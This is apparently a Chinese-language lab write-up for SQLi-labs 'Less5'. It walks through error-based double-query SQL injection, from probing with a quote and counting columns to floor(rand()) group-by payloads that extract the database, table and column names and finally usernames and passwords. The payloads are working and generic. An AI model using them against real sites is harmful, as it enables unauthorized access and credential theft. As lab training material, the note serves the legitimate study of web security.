# Less5——（报错注入）

　　 **?id=1 发现页面查询结果不回显**

![image](assets/image-20251108095738-q9hfaxi.png)

　　 **?id=1' 发现语法报错还是存在的 说明是需要使用报错注入**

　　**查数据库列数**

　　 **?id=1'  order by 3 --+ 正常
    ?id=1'  order by 4 --+ 报错**

　　**查显错**

　　**无论怎么进行查询，结果都会显示You are in .........**

　　**但是当我们查询的字段多于3个后，页面会报错，就可以利用报错注入**
**使用双注（报错注入）**

**as ： 别名 
	顺便说几个常见的:
		rand: 遵循四舍五入把原值转化为指定小数位数
		floor: 向下舍入为指定小数位数
		ceiling: 向上舍入为指定小数位数
	rand: 返回一个介于 0 到 1（不包括 0 和 1）之间的伪随机 float 值
	group by: GROUP BY必须得配合聚合函数来用，根据字段来分类
	**
-使用
```
select count(*) from [table] group by concat('~',([真正的查询语句]),'~'，floor(rand(0)*2))
```
或
```
select count(*),concat_ws(char(32,58,32),([查询语句]),floor(rand(0)*2)) as a from [table] group by a
```
原理：简单来说就是count等聚合函数之后，如果使用分组语句，就会把查询的一部分以错误的形式显示出来

```
?id=-1' union all select count(*),2,concat( '~',(select schema_name from information_schema.schemata limit 4,1),'~',floor(rand()*2)) as a from information_schema.schemata group by a %23 //获取 数据库 security 这里最好实用union all 这样，否则需要多次访问才能获取回复
```
![[Pasted image 20260529164648.png]]
```
剩下的就不一一叙述了
-1' union all select count(*),2,concat( '~',(select table_name from information_schema.tables where table_schema = 'security' limit 3,1),'~',floor(rand()*2)) as a from information_schema.schemata group by a %23 //获取表 users
	-1' union all select count(*),1,concat( '~',(select column_name from information_schema.columns where table_name= 'users' limit 2,1),'~',floor(rand()*2)) as a from information_schema.schemata group by a %23  // 这里爆出了他三个字段，注意如果字段不存在也是返回you are in 
	-1' union all select count(*),1,concat( '~',(select concat(id,username,password) from users limit 2,1),'~',floor(rand()*2)) as a from information_schema.schemata group by a %23  // 成功拿到 password username

```